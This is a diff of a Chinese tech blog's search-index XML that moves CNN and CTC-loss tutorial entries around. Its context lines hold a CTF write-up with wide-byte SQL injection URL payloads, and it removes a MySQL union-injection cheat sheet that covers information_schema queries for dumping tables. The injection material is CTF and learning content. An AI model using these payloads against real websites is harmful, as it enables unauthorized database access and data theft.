@@ -132,7 +132,7 @@
 <p>获取数据库版本 5.5.52-0ubuntu0.14.04.1</p>
 </li>
 <li><p>构造 <code>index.php?id=1%fe%27and%201=2%20%20union%20select%201,ord(mid(user(),1,1))%23</code></p>
-<p>用户名为 <a href="mailto:&#x73;&#x61;&#101;&#x2d;&#x63;&#104;&#105;&#110;&#x61;&#108;&#111;&#118;&#x65;&#114;&#64;&#x31;&#50;&#51;&#46;&#x31;&#50;&#x35;&#x2e;&#x32;&#x33;&#46;&#x32;&#49;&#49;">&#x73;&#x61;&#101;&#x2d;&#x63;&#104;&#105;&#110;&#x61;&#108;&#111;&#118;&#x65;&#114;&#64;&#x31;&#50;&#51;&#46;&#x31;&#50;&#x35;&#x2e;&#x32;&#x33;&#46;&#x32;&#49;&#49;</a></p>
+<p>用户名为 <a href="mailto:&#115;&#97;&#x65;&#x2d;&#99;&#x68;&#x69;&#110;&#x61;&#x6c;&#111;&#118;&#x65;&#x72;&#x40;&#x31;&#x32;&#51;&#x2e;&#49;&#50;&#x35;&#46;&#x32;&#51;&#46;&#50;&#49;&#49;">&#115;&#97;&#x65;&#x2d;&#99;&#x68;&#x69;&#110;&#x61;&#x6c;&#111;&#118;&#x65;&#x72;&#x40;&#x31;&#x32;&#51;&#x2e;&#49;&#50;&#x35;&#46;&#x32;&#51;&#46;&#50;&#49;&#49;</a></p>
 </li>
 <li><p>构造 <code>index.php?id=1%fe%27and%201=2%20%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7361652d6368696e616c6f766572%23</code></p>
 <p>得到表名 ctf,ctf2,ctf3,ctf4,gbksqli,news</p>
@@ -206,6 +206,81 @@
       <tags>
         <tag>CTF</tag>
         <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CNN Basic Introduction</title>
+    <url>/CNN-Basic-Introduction.html</url>
+    <content><![CDATA[<p>对于图像应用，我们经常在神经网络上使用卷积（Convolutional Neural Network），通常缩写为 CNN。</p>
+<span id="more"></span>
+
+<p>下图为 CNN 的基本模型:<br><img src="https://pic3.zhimg.com/v2-7a147703c5181ff9737b41afa6ea6bce_1200x500.jpg"><br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194254881-664443051.jpg"></p>
+<p>卷积神经网络的层级结构</p>
+<ul>
+<li>数据输入层&#x2F; Input layer</li>
+<li>卷积计算层&#x2F; CONV layer</li>
+<li>ReLU 激励层 &#x2F; ReLU layer</li>
+<li>池化层 &#x2F; Pooling layer</li>
+<li>全连接层 &#x2F; FC layer</li>
+</ul>
+<p>一般为一般 CNN 结构依次为</p>
+<ol>
+<li>INPUT</li>
+<li>[[CONV -&gt; RELU]*N -&gt; POOL?]*M</li>
+<li>[FC -&gt; RELU]*K</li>
+<li>FC</li>
+</ol>
+<h2 id="基础原理"><a href="#基础原理" class="headerlink" title="基础原理"></a>基础原理</h2><p>一般的，CNN 的基本结构包括两层，其一为特征提取层，每个神经元的输入与前一层的局部接受域相连，并提取该局部的特征。一旦该局部特征被提取后，它与其它特征间的位置关系也随之确定下来；其二是特征映射层，网络的每个计算层由多个特征映射组成，每个特征映射是一个平面，平面上所有神经元的权值相等。特征映射结构采用影响函数核小的 sigmoid 函数作为卷积网络的激活函数，使得特征映射具有位移不变性。此外，由于一个映射面上的神经元共享权值，因而减少了网络自由参数的个数。卷积神经网络中的每一个卷积层都紧跟着一个用来求局部平均与二次提取的计算层，这种特有的两次特征提取结构减小了特征分辨率。</p>
+<p>CNN 主要用来识别位移、缩放及其他形式扭曲不变性的二维图形，该部分功能主要由池化层实现。由于 CNN 的特征检测层通过训练数据进行学习，所以在使用 CNN 时，避免了显式的特征抽取，而隐式地从训练数据中进行学习；再者由于同一特征映射面上的神经元权值相同，所以网络可以并行学习，这也是卷积网络相对于神经元彼此相连网络的一大优势。卷积神经网络以其局部权值共享的特殊结构在语音识别和图像处理方面有着独特的优越性，其布局更接近于实际的生物神经网络，权值共享降低了网络的复杂性，特别是多维输入向量的图像可以直接输入网络这一特点避免了特征提取和分类过程中数据重建的复杂度。</p>
+<h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p>假设给定一张图（可能是字母 X 或者字母 O），通过 CNN 即可识别出是 X 还是 O，如下图所示，那怎么做到的呢</p>
+<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202515631-1056461501.png"></p>
+<p>如果采用经典的神经网络模型，则需要读取整幅图像作为神经网络模型的输入（即全连接的方式），当图像的尺寸越大时，其连接的参数将变得很多，从而导致计算量非常大。<br>　　而我们人类对外界的认知一般是从局部到全局，先对局部有感知的认识，再逐步对全体有认知，这是人类的认识模式。在图像中的空间联系也是类似，局部范围内的像素之间联系较为紧密，而距离较远的像素则相关性较弱。因而，每个神经元其实没有必要对全局图像进行感知，只需要对局部进行感知，然后在更高层将局部的信息综合起来就得到了全局的信息。这种模式就是卷积神经网络中降低参数数目的重要神器：局部感受野。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202559906-1527391226.png"></p>
+<p>如果字母 X、字母 O 是固定不变的，那么最简单的方式就是图像之间的像素一一比对就行，但在现实生活中，字体都有着各个形态上的变化（例如手写文字识别），例如平移、缩放、旋转、微变形等等，如下图所示：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202627271-1361985686.png"></p>
+<p>我们的目标是对于各种形态变化的 X 和 O，都能通过 CNN 准确地识别出来，这就涉及到应该如何有效地提取特征，作为识别的关键因子。回想前面讲到的“局部感受野”模式，对于 CNN 来说，它是一小块一小块地来进行比对，在两幅图像中大致相同的位置找到一些粗糙的特征（小块图像）进行匹配，相比起传统的整幅图逐一比对的方式，CNN 的这种小块匹配方式能够更好的比较两幅图像之间的相似性。如下图：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202646989-200335159.png"></p>
+<p>以字母 X 为例，可以提取出三个重要特征（两个交叉线、一个对角线），如下图所示</p>
+<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202702561-93616180.png"></p>
+<p>假如以像素值”1”代表白色，像素值”-1”代表黑色，则字母 X 的三个重要特征如下：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202719374-1192154873.png"></p>
+<p>那么我们通过匹配图片的特征就可以识别出图片</p>
+<h3 id="卷积层介绍"><a href="#卷积层介绍" class="headerlink" title="卷积层介绍"></a>卷积层介绍</h3><p>这一层就是卷积神经网络最重要的一个层次，也是“卷积神经网络”的名字来源。<br>在这个卷积层，有两个关键操作：</p>
+<ul>
+<li>局部关联。每个神经元看做一个滤波器(filter)</li>
+<li>窗口(receptive field)滑动， filter 对局部数据计算</li>
+</ul>
+<p>卷积层重要名词：</p>
+<ul>
+<li>深度&#x2F;depth（解释见下图）</li>
+<li>步长&#x2F;stride （窗口一次滑动的长度）</li>
+<li>填充值&#x2F;zero-padding</li>
+</ul>
+<p><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194425147-845167791.png"></p>
+<p>填充值是什么呢？以下图为例子，比如有这么一个 5<em>5 的图片（一个格子一个像素），我们滑动窗口取 2</em>2，步长取 2，那么我们发现还剩下 1 个像素没法滑完，那怎么办呢？</p>
+<p><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194452615-1175169258.png"></p>
+<p>那我们在原先的矩阵加了一层填充值，使得变成 6*6 的矩阵，那么窗口就可以刚好把所有像素遍历完。这就是填充值的作用。<br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194526537-1629104898.png"></p>
+<p>卷积的计算（注意，下面蓝色矩阵周围有一圈灰色的框，那些就是上面所说到的填充值）<br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194547100-2091436500.jpg"></p>
+<p>蓝色的矩阵(输入图像)对粉色的矩阵（filter）进行矩阵内积计算并将三个内积运算的结果与偏置值 b 相加,如图：<br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194806256-1671846037.png"></p>
+<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>卷积神经网络之典型 CNN</p>
+<ul>
+<li>LeNet，这是最早用于数字识别的 CNN</li>
+<li>AlexNet， 2012 ILSVRC 比赛远超第 2 名的 CNN，比</li>
+<li>LeNet 更深，用多层小卷积层叠加替换单大卷积层。</li>
+<li>ZF Net， 2013 ILSVRC 比赛冠军</li>
+<li>GoogLeNet， 2014 ILSVRC 比赛冠军</li>
+<li>VGGNet， 2014 ILSVRC 比赛中的模型，图像识别略差于 GoogLeNet，但是在很多图像转化学习问题(比如 object detection)上效果奇好</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。</p>
+<p>CNN 一个非常重要的特点就是头重脚轻（越往输入权值越小，越往输出权值越多），呈现出一个倒三角的形态，这就很好地避免了 BP 神经网络中反向传播的时候梯度损失得太快。</p>
+<p>卷积神经网络 CNN 主要用来识别位移、缩放及其他形式扭曲不变性的二维图形。由于 CNN 的特征检测层通过训练数据进行学习，所以在使用 CNN 时，避免了显式的特征抽取，而隐式地从训练数据中进行学习；再者由于同一特征映射面上的神经元权值相同，所以网络可以并行学习，这也是卷积网络相对于神经元彼此相连网络的一大优势。卷积神经网络以其局部权值共享的特殊结构在语音识别和图像处理方面有着独特的优越性，其布局更接近于实际的生物神经网络，权值共享降低了网络的复杂性，特别是多维输入向量的图像可以直接输入网络这一特点避免了特征提取和分类过程中数据重建的复杂度。</p>
+]]></content>
+      <categories>
+        <category>Machine Learning</category>
+      </categories>
+      <tags>
+        <tag>ML</tag>
+        <tag>CNN</tag>
       </tags>
   </entry>
   <entry>
@@ -352,109 +427,43 @@
       </tags>
   </entry>
   <entry>
-    <title>CNN Basic Introduction</title>
-    <url>/CNN-Basic-Introduction.html</url>
-    <content><![CDATA[<p>对于图像应用，我们经常在神经网络上使用卷积（Convolutional Neural Network），通常缩写为 CNN。</p>
+    <title>CTC Loss: A Basic Introduction</title>
+    <url>/CTC-LOSS-Basic-Introduction.html</url>
+    <content><![CDATA[<p>在语音识别中，我们的数据集是音频文件和其对应的文本，不幸的是，音频文件和文本很难再单词的单位上对齐。除了语言识别，在 OCR，机器翻译中，都存在类似的 Sequence to Sequence 结构，同样也需要在预处理操作时进行对齐，但是这种对齐有时候是非常困难的。如果不使用对齐而直接训练模型时，由于人的语速的不同，或者字符间距离的不同，导致模型很难收敛。</p>
+<p>CTC(Connectionist Temporal Classification)是一种避开输入与输出的一种方式，是非常适合语音识别或者 OCR 这种应用的。</p>
 <span id="more"></span>
 
-<p>下图为 CNN 的基本模型:<br><img src="https://pic3.zhimg.com/v2-7a147703c5181ff9737b41afa6ea6bce_1200x500.jpg"><br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194254881-664443051.jpg"></p>
-<p>卷积神经网络的层级结构</p>
+<h2 id="算法详解（以语音识别为例）"><a href="#算法详解（以语音识别为例）" class="headerlink" title="算法详解（以语音识别为例）"></a>算法详解（以语音识别为例）</h2><p>给定输入 X ，CTC 输出每个可能输出及其条件概率。问题的关键是 CTC 的输出概率是如何考虑 X 和 Y 之间的对齐的，这种对齐也是构建损失函数的基础。所以，首先我们分析 CTC 的对齐方式，然后我们在分析 CTC 的损失函数的构造。</p>
+<h3 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h3><p>需要注意的是，CTC 本身是不需要对齐的，但是我们需要知道 X 的输出路径和最终输出结果的对应关系，因为在 CTC 中，多个输出路径可能对应一个输出结果，举例来理解。例如在 OCR 的任务中，输入 X 是含有“CAT”的图片，输出 Y 是文本[C, A, T]。将 X 分割成若干个时间片，每个时间片得到一个输出，一个最简答的解决方案是合并连续重复出现的字母，如图：</p>
+<p><img src="https://pic4.zhimg.com/80/v2-c6060dd92a0036ee9ac7d246b145c097_hd.jpg"></p>
+<p>这个问题有两个缺点：</p>
 <ul>
-<li>数据输入层&#x2F; Input layer</li>
-<li>卷积计算层&#x2F; CONV layer</li>
-<li>ReLU 激励层 &#x2F; ReLU layer</li>
-<li>池化层 &#x2F; Pooling layer</li>
-<li>全连接层 &#x2F; FC layer</li>
+<li>几乎不可能将 X 的每个时间片都和输出 Y 对应上，例如 OCR 中字符的间隔，语音识别中的停顿;</li>
+<li>不能处理有连续重复字符出现的情况，例如单词“HELLO”，按照上面的算法，输出的是“HELO”而非“HELLO”。</li>
 </ul>
-<p>一般为一般 CNN 结构依次为</p>
-<ol>
-<li>INPUT</li>
-<li>[[CONV -&gt; RELU]*N -&gt; POOL?]*M</li>
-<li>[FC -&gt; RELU]*K</li>
-<li>FC</li>
-</ol>
-<h2 id="基础原理"><a href="#基础原理" class="headerlink" title="基础原理"></a>基础原理</h2><p>一般的，CNN 的基本结构包括两层，其一为特征提取层，每个神经元的输入与前一层的局部接受域相连，并提取该局部的特征。一旦该局部特征被提取后，它与其它特征间的位置关系也随之确定下来；其二是特征映射层，网络的每个计算层由多个特征映射组成，每个特征映射是一个平面，平面上所有神经元的权值相等。特征映射结构采用影响函数核小的 sigmoid 函数作为卷积网络的激活函数，使得特征映射具有位移不变性。此外，由于一个映射面上的神经元共享权值，因而减少了网络自由参数的个数。卷积神经网络中的每一个卷积层都紧跟着一个用来求局部平均与二次提取的计算层，这种特有的两次特征提取结构减小了特征分辨率。</p>
-<p>CNN 主要用来识别位移、缩放及其他形式扭曲不变性的二维图形，该部分功能主要由池化层实现。由于 CNN 的特征检测层通过训练数据进行学习，所以在使用 CNN 时，避免了显式的特征抽取，而隐式地从训练数据中进行学习；再者由于同一特征映射面上的神经元权值相同，所以网络可以并行学习，这也是卷积网络相对于神经元彼此相连网络的一大优势。卷积神经网络以其局部权值共享的特殊结构在语音识别和图像处理方面有着独特的优越性，其布局更接近于实际的生物神经网络，权值共享降低了网络的复杂性，特别是多维输入向量的图像可以直接输入网络这一特点避免了特征提取和分类过程中数据重建的复杂度。</p>
-<h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p>假设给定一张图（可能是字母 X 或者字母 O），通过 CNN 即可识别出是 X 还是 O，如下图所示，那怎么做到的呢</p>
-<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202515631-1056461501.png"></p>
-<p>如果采用经典的神经网络模型，则需要读取整幅图像作为神经网络模型的输入（即全连接的方式），当图像的尺寸越大时，其连接的参数将变得很多，从而导致计算量非常大。<br>　　而我们人类对外界的认知一般是从局部到全局，先对局部有感知的认识，再逐步对全体有认知，这是人类的认识模式。在图像中的空间联系也是类似，局部范围内的像素之间联系较为紧密，而距离较远的像素则相关性较弱。因而，每个神经元其实没有必要对全局图像进行感知，只需要对局部进行感知，然后在更高层将局部的信息综合起来就得到了全局的信息。这种模式就是卷积神经网络中降低参数数目的重要神器：局部感受野。</p>
-<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202559906-1527391226.png"></p>
-<p>如果字母 X、字母 O 是固定不变的，那么最简单的方式就是图像之间的像素一一比对就行，但在现实生活中，字体都有着各个形态上的变化（例如手写文字识别），例如平移、缩放、旋转、微变形等等，如下图所示：</p>
-<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202627271-1361985686.png"></p>
-<p>我们的目标是对于各种形态变化的 X 和 O，都能通过 CNN 准确地识别出来，这就涉及到应该如何有效地提取特征，作为识别的关键因子。回想前面讲到的“局部感受野”模式，对于 CNN 来说，它是一小块一小块地来进行比对，在两幅图像中大致相同的位置找到一些粗糙的特征（小块图像）进行匹配，相比起传统的整幅图逐一比对的方式，CNN 的这种小块匹配方式能够更好的比较两幅图像之间的相似性。如下图：</p>
-<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202646989-200335159.png"></p>
-<p>以字母 X 为例，可以提取出三个重要特征（两个交叉线、一个对角线），如下图所示</p>
-<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202702561-93616180.png"></p>
-<p>假如以像素值”1”代表白色，像素值”-1”代表黑色，则字母 X 的三个重要特征如下：</p>
-<p><img src="https://img2018.cnblogs.com/blog/1226410/201810/1226410-20181009202719374-1192154873.png"></p>
-<p>那么我们通过匹配图片的特征就可以识别出图片</p>
-<h3 id="卷积层介绍"><a href="#卷积层介绍" class="headerlink" title="卷积层介绍"></a>卷积层介绍</h3><p>这一层就是卷积神经网络最重要的一个层次，也是“卷积神经网络”的名字来源。<br>在这个卷积层，有两个关键操作：</p>
+<p>为了解决上面的问题，CTC 引入了空白字符 \epsilon ，例如 OCR 中的字符间距，语音识别中的停顿均表示为 \epsilon 。所以，CTC 的对齐涉及去除重复字母和去除 \epsilon 两部分</p>
+<p><img src="https://pic2.zhimg.com/80/v2-19628be2860d7c47703c93323a80ed71_hd.jpg"></p>
+<p>这种对齐方式有三个特征：</p>
 <ul>
-<li>局部关联。每个神经元看做一个滤波器(filter)</li>
-<li>窗口(receptive field)滑动， filter 对局部数据计算</li>
+<li>X 与 Y 之间的时间片映射是单调的，即如果 X 向前移动一个时间片， Y 保持不动或者也向前移动一个时间片；</li>
+<li>X 与 Y 之间的映射是多对一的，即多个输出可能对应一个映射，反之则不成立，所以也有了特征 3；</li>
+<li>X 的长度大于等于 Y 的长度。</li>
 </ul>
-<p>卷积层重要名词：</p>
-<ul>
-<li>深度&#x2F;depth（解释见下图）</li>
-<li>步长&#x2F;stride （窗口一次滑动的长度）</li>
-<li>填充值&#x2F;zero-padding</li>
-</ul>
-<p><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194425147-845167791.png"></p>
-<p>填充值是什么呢？以下图为例子，比如有这么一个 5<em>5 的图片（一个格子一个像素），我们滑动窗口取 2</em>2，步长取 2，那么我们发现还剩下 1 个像素没法滑完，那怎么办呢？</p>
-<p><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194452615-1175169258.png"></p>
-<p>那我们在原先的矩阵加了一层填充值，使得变成 6*6 的矩阵，那么窗口就可以刚好把所有像素遍历完。这就是填充值的作用。<br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194526537-1629104898.png"></p>
-<p>卷积的计算（注意，下面蓝色矩阵周围有一圈灰色的框，那些就是上面所说到的填充值）<br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194547100-2091436500.jpg"></p>
-<p>蓝色的矩阵(输入图像)对粉色的矩阵（filter）进行矩阵内积计算并将三个内积运算的结果与偏置值 b 相加,如图：<br><img src="https://images2015.cnblogs.com/blog/1093303/201704/1093303-20170430194806256-1671846037.png"></p>
-<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>卷积神经网络之典型 CNN</p>
-<ul>
-<li>LeNet，这是最早用于数字识别的 CNN</li>
-<li>AlexNet， 2012 ILSVRC 比赛远超第 2 名的 CNN，比</li>
-<li>LeNet 更深，用多层小卷积层叠加替换单大卷积层。</li>
-<li>ZF Net， 2013 ILSVRC 比赛冠军</li>
-<li>GoogLeNet， 2014 ILSVRC 比赛冠军</li>
-<li>VGGNet， 2014 ILSVRC 比赛中的模型，图像识别略差于 GoogLeNet，但是在很多图像转化学习问题(比如 object detection)上效果奇好</li>
-</ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。</p>
-<p>CNN 一个非常重要的特点就是头重脚轻（越往输入权值越小，越往输出权值越多），呈现出一个倒三角的形态，这就很好地避免了 BP 神经网络中反向传播的时候梯度损失得太快。</p>
-<p>卷积神经网络 CNN 主要用来识别位移、缩放及其他形式扭曲不变性的二维图形。由于 CNN 的特征检测层通过训练数据进行学习，所以在使用 CNN 时，避免了显式的特征抽取，而隐式地从训练数据中进行学习；再者由于同一特征映射面上的神经元权值相同，所以网络可以并行学习，这也是卷积网络相对于神经元彼此相连网络的一大优势。卷积神经网络以其局部权值共享的特殊结构在语音识别和图像处理方面有着独特的优越性，其布局更接近于实际的生物神经网络，权值共享降低了网络的复杂性，特别是多维输入向量的图像可以直接输入网络这一特点避免了特征提取和分类过程中数据重建的复杂度。</p>
+<h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>CTC 的时间片的输出和输出序列的映射如图</p>
+<p><img src="https://pic3.zhimg.com/80/v2-33c568826c1ea577b2dd9ad5650cb9ee_hd.jpg"></p>
+<p>也就是说，对应标签 Y ，其关于输入 X 的后验概率可以表示为所有映射为 Y 的路径之和，我们的目标就是最大化 Y 关于 x &#x3D; y 的后验概率 P(Y|X) 。假设每个时间片的输出是相互独立的，则路径的后验概率是每个时间片概率的累积，公式及其详细含义如图</p>
+<p><img src="https://pic2.zhimg.com/80/v2-a67c5a14189f26915c9533ed8ca779e1_hd.jpg"></p>
+<p>上面的 CTC 算法存在性能问题，对于一个时间片长度为 T 的 N 分类任务，所有可能的路径数为 T^N ，在很多情况下，这几乎是一个宇宙级别的数字，用于计算 Loss 几乎是不现实的。在 CTC 中采用了动态规划的思想来对查找路径进行剪枝，算法的核心思想是如果路径 \pi_1 和路径 \pi_2 在时间片 t 之前的输出均相等，我们就可以提前合并他们，如图</p>
+<p><img src="https://pic4.zhimg.com/80/v2-87e7590c1a257520d631276879c3693b_hd.jpg"></p>
+<p>其中，横轴的单位是 X 的时间片，纵轴的单位是 Y 插入 \epsilon 的序列 Z 。例如对于单词“ZOO”，插入 \epsilon 后为：</p>
+<p><img src="https://www.zhihu.com/equation?tex=Z+=%5C%7B%5Cepsilon,+Z,+%5Cepsilon,+O,+%5Cepsilon,+O,+%5Cepsilon%5C%7D%5Ctag%7B2%7D"></p>
 ]]></content>
       <categories>
         <category>Machine Learning</category>
       </categories>
       <tags>
         <tag>ML</tag>
-        <tag>CNN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>EASY SQL_Injection</title>
-    <url>/EASY-SQL-Injection.html</url>
-    <content><![CDATA[<blockquote>
-<p>以 <code>mysql</code> 为例， 不同数据库的特殊情况另行整理</p>
-</blockquote>
-<h2 id="0x00-判断注入点"><a href="#0x00-判断注入点" class="headerlink" title="0x00 判断注入点"></a>0x00 判断注入点</h2><p><code>1 and 1=1</code> 返回正常， <code>1 and 1=2</code> 返回错误说明存在注入点<br>(以上为数字型，字符串型应加引号，如 <code>1&#39;and’1&#39;=‘1</code>)</p>
-<span id="more"></span>
-
-<h2 id="0x01-判断字段数（列数）"><a href="#0x01-判断字段数（列数）" class="headerlink" title="0x01 判断字段数（列数）"></a>0x01 判断字段数（列数）</h2><p>使用 <code>order by &lt;num&gt;</code> , 根据返回判断列数，当 <code>&lt;num&gt;</code> 大于最大列数时，将返回错误</p>
-<h2 id="0x02-匹配字段位置"><a href="#0x02-匹配字段位置" class="headerlink" title="0x02 匹配字段位置"></a>0x02 匹配字段位置</h2><p>根据字段数构造联合查询语句 <code>id=1 and 1=2 union select 1,2,...n</code> ， <code>n</code> 即为字段数，根据不同数字在页面中出现的位置，选择合适的字段作为 payload 对数据库中的信息进行查询</p>
-<h2 id="0x03-内置函数和系统数据库"><a href="#0x03-内置函数和系统数据库" class="headerlink" title="0x03 内置函数和系统数据库"></a>0x03 内置函数和系统数据库</h2><p>version() 版本信息<br>database() 当前数据库<br>user() 当前用户</p>
-<ul>
-<li><code>and ord(mid(user(),1,1))=114 </code> &#x2F;&#x2F;即 user() 以字母 ’r‘ 开头</li>
-</ul>
-<p>@@global.version_compile_os from mysql.user</p>
-<h2 id="0x04-使用-mysql-的数据库的系统库获取信息"><a href="#0x04-使用-mysql-的数据库的系统库获取信息" class="headerlink" title="0x04 使用 mysql 的数据库的系统库获取信息"></a>0x04 使用 mysql 的数据库的系统库获取信息</h2><p>（mysql 5 以上）information_schema</p>
-<p><code>select SCHEME_NAME from information_schema.SCHEMATA limit 0,1</code> &#x2F;&#x2F;查看库名</p>
-<p><code>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&lt;database&gt; limit 0,1</code> &#x2F;&#x2F;查看表名，<database> 可能需要转为 0xHHHHHHH 的十六进制格式。</p>
-<p><code>select  COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&lt;table&gt; limit 0,1</code>&#x2F;&#x2F;查看列名</p>
-<p><code>select &lt;column_1&gt;,&lt;column_2&gt;,concat(&lt;column_3&gt;,&lt;column_4&gt;) from &lt;table&gt; limit 0,1</code> &#x2F;&#x2F;查看表内信息</p>
-<p>（concat 函数中可以考虑用如 0x3c 之类的标识符进行分割）</p>
-<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>一般数据库中密码都会进行 md5 加密， 因此要获取明文需要对其进行解密</p>
-]]></content>
-      <categories>
-        <category>Penetration</category>
-      </categories>
-      <tags>
-        <tag>SQL Injection</tag>
+        <tag>CTC</tag>
       </tags>
   </entry>
   <entry>
@@ -520,46 +529,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTC Loss: A Basic Introduction</title>
-    <url>/CTC-LOSS-Basic-Introduction.html</url>
-    <content><![CDATA[<p>在语音识别中，我们的数据集是音频文件和其对应的文本，不幸的是，音频文件和文本很难再单词的单位上对齐。除了语言识别，在 OCR，机器翻译中，都存在类似的 Sequence to Sequence 结构，同样也需要在预处理操作时进行对齐，但是这种对齐有时候是非常困难的。如果不使用对齐而直接训练模型时，由于人的语速的不同，或者字符间距离的不同，导致模型很难收敛。</p>
-<p>CTC(Connectionist Temporal Classification)是一种避开输入与输出的一种方式，是非常适合语音识别或者 OCR 这种应用的。</p>
-<span id="more"></span>
-
-<h2 id="算法详解（以语音识别为例）"><a href="#算法详解（以语音识别为例）" class="headerlink" title="算法详解（以语音识别为例）"></a>算法详解（以语音识别为例）</h2><p>给定输入 X ，CTC 输出每个可能输出及其条件概率。问题的关键是 CTC 的输出概率是如何考虑 X 和 Y 之间的对齐的，这种对齐也是构建损失函数的基础。所以，首先我们分析 CTC 的对齐方式，然后我们在分析 CTC 的损失函数的构造。</p>
-<h3 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h3><p>需要注意的是，CTC 本身是不需要对齐的，但是我们需要知道 X 的输出路径和最终输出结果的对应关系，因为在 CTC 中，多个输出路径可能对应一个输出结果，举例来理解。例如在 OCR 的任务中，输入 X 是含有“CAT”的图片，输出 Y 是文本[C, A, T]。将 X 分割成若干个时间片，每个时间片得到一个输出，一个最简答的解决方案是合并连续重复出现的字母，如图：</p>
-<p><img src="https://pic4.zhimg.com/80/v2-c6060dd92a0036ee9ac7d246b145c097_hd.jpg"></p>
-<p>这个问题有两个缺点：</p>
-<ul>
-<li>几乎不可能将 X 的每个时间片都和输出 Y 对应上，例如 OCR 中字符的间隔，语音识别中的停顿;</li>
-<li>不能处理有连续重复字符出现的情况，例如单词“HELLO”，按照上面的算法，输出的是“HELO”而非“HELLO”。</li>
-</ul>
-<p>为了解决上面的问题，CTC 引入了空白字符 \epsilon ，例如 OCR 中的字符间距，语音识别中的停顿均表示为 \epsilon 。所以，CTC 的对齐涉及去除重复字母和去除 \epsilon 两部分</p>
-<p><img src="https://pic2.zhimg.com/80/v2-19628be2860d7c47703c93323a80ed71_hd.jpg"></p>
-<p>这种对齐方式有三个特征：</p>
-<ul>
-<li>X 与 Y 之间的时间片映射是单调的，即如果 X 向前移动一个时间片， Y 保持不动或者也向前移动一个时间片；</li>
-<li>X 与 Y 之间的映射是多对一的，即多个输出可能对应一个映射，反之则不成立，所以也有了特征 3；</li>
-<li>X 的长度大于等于 Y 的长度。</li>
-</ul>
-<h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>CTC 的时间片的输出和输出序列的映射如图</p>
-<p><img src="https://pic3.zhimg.com/80/v2-33c568826c1ea577b2dd9ad5650cb9ee_hd.jpg"></p>
-<p>也就是说，对应标签 Y ，其关于输入 X 的后验概率可以表示为所有映射为 Y 的路径之和，我们的目标就是最大化 Y 关于 x &#x3D; y 的后验概率 P(Y|X) 。假设每个时间片的输出是相互独立的，则路径的后验概率是每个时间片概率的累积，公式及其详细含义如图</p>
-<p><img src="https://pic2.zhimg.com/80/v2-a67c5a14189f26915c9533ed8ca779e1_hd.jpg"></p>
-<p>上面的 CTC 算法存在性能问题，对于一个时间片长度为 T 的 N 分类任务，所有可能的路径数为 T^N ，在很多情况下，这几乎是一个宇宙级别的数字，用于计算 Loss 几乎是不现实的。在 CTC 中采用了动态规划的思想来对查找路径进行剪枝，算法的核心思想是如果路径 \pi_1 和路径 \pi_2 在时间片 t 之前的输出均相等，我们就可以提前合并他们，如图</p>
-<p><img src="https://pic4.zhimg.com/80/v2-87e7590c1a257520d631276879c3693b_hd.jpg"></p>
-<p>其中，横轴的单位是 X 的时间片，纵轴的单位是 Y 插入 \epsilon 的序列 Z 。例如对于单词“ZOO”，插入 \epsilon 后为：</p>
-<p><img src="https://www.zhihu.com/equation?tex=Z+=%5C%7B%5Cepsilon,+Z,+%5Cepsilon,+O,+%5Cepsilon,+O,+%5Cepsilon%5C%7D%5Ctag%7B2%7D"></p>
-]]></content>
-      <categories>
-        <category>Machine Learning</category>
-      </categories>
-      <tags>
-        <tag>ML</tag>
-        <tag>CTC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Arch Linux 允许通过轻触触摸板执行点击</title>
